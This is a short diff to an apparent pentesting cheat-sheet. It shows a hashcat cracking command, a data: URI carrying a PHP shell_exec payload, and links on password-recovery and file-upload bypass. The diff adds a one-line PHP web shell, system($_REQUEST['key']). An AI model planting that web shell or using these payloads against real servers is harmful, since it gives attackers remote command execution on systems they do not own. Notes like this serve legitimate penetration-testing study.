@@ -264,7 +264,6 @@ hashcat -m <mode> -a 0 hashlist.txt /root/wordlist/rockyou.txt
 data:text/plain,This is a test
 data:test/plain,<?php echo shell_exec("whoami") ?>
 ```
-
 ### resources
 https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/exploiting-password-recovery-functionalities/  
 
@@ -273,3 +272,8 @@ https://0xayub.gitbook.io/blog/
 
 ### file upload bypass
 https://book.hacktricks.xyz/pentesting-web/file-upload
+
+### php code
+```
+system($_REQUEST['key']);
+```
